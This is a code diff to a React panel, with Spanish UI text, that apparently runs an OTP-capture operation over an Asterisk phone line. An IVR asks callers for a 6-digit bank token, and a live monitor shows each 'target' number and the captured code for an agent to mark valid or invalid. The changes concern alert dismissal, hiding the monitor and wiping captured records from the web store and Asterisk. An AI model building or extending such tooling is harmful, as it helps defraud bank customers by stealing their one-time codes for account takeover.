@@ -554,9 +554,11 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
   const durationTimerRef = useRef<any>(null);
   const [liveCapturedAlert, setLiveCapturedAlert] = useState<CapturedOtpRecord | null>(null);
+  const [showLiveMonitor, setShowLiveMonitor] = useState<boolean>(true);
   const lastAlertKeyRef = useRef<string>('');
   const activeCallRef = useRef(activeCall);
   const validRecordIdsRef = useRef<Set<string>>(new Set());
+  const dismissedAlertKeysRef = useRef<Set<string>>(new Set());
 
   useEffect(() => {
     activeCallRef.current = activeCall;
@@ -574,31 +576,40 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         if (data.records.length > 0) {
           const newest = data.records[0];
           const recordKey = `${newest.id}_${newest.otp}_${newest.status}`;
-          const isValid =
+
+          const isDecided =
             newest.status === 'valid' ||
+            newest.status === 'invalid' ||
             validRecordIdsRef.current.has(newest.id) ||
             (newest.otp && validRecordIdsRef.current.has(newest.otp)) ||
             (newest.number && validRecordIdsRef.current.has(newest.number));
 
-          if (isValid) {
-            // Cuando el código ya fue validado, se quita la alerta y se quita el HUD de captura en tiempo real
+          const isDismissed =
+            dismissedAlertKeysRef.current.has(newest.id) ||
+            dismissedAlertKeysRef.current.has(newest.otp) ||
+            (newest.number && dismissedAlertKeysRef.current.has(newest.number));
+
+          if (isDecided || isDismissed) {
+            // Cuando el código ya fue decidido (válido/inválido) o descartado por el usuario, no mostrar banner de alerta
             setLiveCapturedAlert(null);
-            setActiveCall((prev) => {
-              if (prev && prev.name?.includes('Cliente Transferido')) {
-                return null;
-              }
-              if (prev && prev.capturedOtp) {
-                return {
-                  ...prev,
-                  capturedOtp: undefined,
-                  status: prev.status === 'otp_captured' ? 'connected' : prev.status,
-                  otpStatus: 'valid',
-                };
-              }
-              return prev;
-            });
+            if (isDecided) {
+              setActiveCall((prev) => {
+                if (prev && prev.name?.includes('Cliente Transferido')) {
+                  return null;
+                }
+                if (prev && prev.capturedOtp === newest.otp) {
+                  return {
+                    ...prev,
+                    capturedOtp: undefined,
+                    status: prev.status === 'otp_captured' ? 'connected' : prev.status,
+                    otpStatus: newest.status as any,
+                  };
+                }
+                return prev;
+              });
+            }
           } else {
-            // Mantener el banner de alerta solo si está pendiente de validación
+            // Mantener el banner de alerta solo si está realmente pendiente de validación y no fue descartado
             setLiveCapturedAlert((prev) => {
               if (!prev || prev.id !== newest.id || prev.otp !== newest.otp || prev.status !== newest.status) {
                 return newest;
@@ -626,7 +637,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               } catch (e) {}
             }
 
-            // Actualizar el HUD activo solo si hay cambios reales para evitar re-renders cíclicos
+            // CRÍTICO: Actualizar el HUD activo ÚNICAMENTE si ya hay una llamada en curso lanzada por el usuario.
+            // NUNCA crear llamadas fantasma para códigos de sesiones pasadas para evitar que el HUD aparezca y desaparezca.
             setActiveCall((prev) => {
               if (prev && prev.isActive) {
                 if (prev.capturedOtp === newest.otp && prev.otpStatus === newest.status) {
@@ -639,20 +651,12 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   otpStatus: (newest.status as any) || prev.otpStatus || 'pending',
                 };
               }
-              // Si no estaba activo el HUD, activarlo automáticamente para mostrar los dígitos al agente
-              return {
-                isActive: true,
-                number: newest.number || 'Cliente en Línea',
-                name: `Cliente Transferido (${newest.channel || 'Ext. 7777 / 6666'})`,
-                service: selectedService || 'bank',
-                status: 'otp_captured',
-                capturedOtp: newest.otp,
-                otpStatus: (newest.status as any) || 'pending',
-                duration: 12,
-                channel: newest.channel || 'PJSIP',
-              };
+              // No hay llamada activa: no recrear HUD
+              return prev;
             });
           }
+        } else {
+          setLiveCapturedAlert(null);
         }
       }
     } catch (err) {
@@ -1184,12 +1188,20 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     setTimeout(() => setCopiedId(null), 2500);
   };
 
-  // Clear history
+  // Clear history and wipe old test codes from Asterisk AstDB
   const handleClearHistory = async () => {
-    if (!confirm('¿Deseas vaciar el historial de capturas de producción?')) return;
+    if (!confirm('¿Deseas vaciar todos los registros y códigos de pruebas anteriores tanto de la web como de Asterisk?')) return;
     try {
-      await fetch('/api/asterisk/otp/records', { method: 'DELETE' });
+      await fetch('/api/asterisk/otp/records?clear=1', { method: 'DELETE' });
       setOtpRecords([]);
+      setLiveCapturedAlert(null);
+      validRecordIdsRef.current.clear();
+      dismissedAlertKeysRef.current.clear();
+      setActiveCall((prev) => (prev ? { ...prev, capturedOtp: undefined, otpStatus: 'pending' } : null));
+      setLaunchFeedback({
+        text: 'Historial y registros de pruebas anteriores eliminados con éxito.',
+        type: 'success',
+      });
     } catch (e) {}
   };
 
@@ -1307,9 +1319,16 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               <button
                 id="btn-dismiss-live-alert"
                 type="button"
-                onClick={() => setLiveCapturedAlert(null)}
-                className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-all ml-2"
-                title="Ocultar aviso"
+                onClick={() => {
+                  if (liveCapturedAlert) {
+                    dismissedAlertKeysRef.current.add(liveCapturedAlert.id);
+                    dismissedAlertKeysRef.current.add(liveCapturedAlert.otp);
+                    if (liveCapturedAlert.number) dismissedAlertKeysRef.current.add(liveCapturedAlert.number);
+                  }
+                  setLiveCapturedAlert(null);
+                }}
+                className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-all ml-2 cursor-pointer"
+                title="Descartar y ocultar aviso"
               >
                 <X className="w-5 h-5" />
               </button>
@@ -2960,7 +2979,7 @@ echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
       )}
 
       {/* LIVE CAPTURED OTP MONITOR FOR AGENT (Prominent HUD) */}
-      {otpRecords.length > 0 && (
+      {otpRecords.length > 0 && showLiveMonitor && (
         <div className="p-6 rounded-2xl bg-gradient-to-br from-slate-900 via-slate-950 to-slate-900 border-2 border-emerald-500/50 shadow-2xl shadow-emerald-500/10 space-y-4">
           <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
             <div className="flex items-center gap-2.5">
@@ -2973,8 +2992,19 @@ echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
                 <span>MONITOR EN VIVO DEL AGENTE: ÚLTIMO TOKEN CAPTURADO DEL CLIENTE</span>
               </h3>
             </div>
-            <div className="text-xs font-mono text-slate-400">
-              Objetivo: <strong className="text-sky-400 font-bold">{otpRecords[0].number}</strong> ({otpRecords[0].service || 'Banco / Antifraude'}) • <span className="text-slate-400">{otpRecords[0].timestamp}</span>
+            <div className="flex items-center gap-3">
+              <div className="text-xs font-mono text-slate-400">
+                Objetivo: <strong className="text-sky-400 font-bold">{otpRecords[0].number}</strong> ({otpRecords[0].service || 'Banco / Antifraude'}) • <span className="text-slate-400">{otpRecords[0].timestamp}</span>
+              </div>
+              <button
+                type="button"
+                onClick={() => setShowLiveMonitor(false)}
+                className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-all cursor-pointer text-xs flex items-center gap-1"
+                title="Ocultar monitor de dígitos"
+              >
+                <X className="w-4 h-4" />
+                <span className="hidden sm:inline text-[11px]">Ocultar</span>
+              </button>
             </div>
           </div>
 
@@ -3039,7 +3069,7 @@ echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
             </div>
           </div>
 
-          <div className="flex items-center justify-between text-xs pt-2 border-t border-slate-800/80">
+          <div className="flex flex-wrap items-center justify-between gap-2 text-xs pt-2 border-t border-slate-800/80">
             <span className="text-slate-400">
               Estado actual del código:{' '}
               {otpRecords[0].status === 'valid' ? (
@@ -3050,9 +3080,19 @@ echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
                 <strong className="text-amber-400 font-bold">⏳ Pendiente de decisión del asesor</strong>
               )}
             </span>
-            <span className="text-[11px] text-slate-500 font-mono">
-              Audio configurado en IVR: <span className="text-emerald-400">"Por favor digite su TOKEN de 6 dígitos"</span>
-            </span>
+            <div className="flex items-center gap-3">
+              <span className="text-[11px] text-slate-500 font-mono hidden md:inline">
+                Audio configurado en IVR: <span className="text-emerald-400">"Por favor digite su TOKEN de 6 dígitos"</span>
+              </span>
+              <button
+                type="button"
+                onClick={handleClearHistory}
+                className="text-xs text-rose-400 hover:text-rose-300 underline font-medium cursor-pointer"
+                title="Borrar códigos de pruebas anteriores"
+              >
+                Limpiar datos de prueba
+              </button>
+            </div>
           </div>
         </div>
       )}
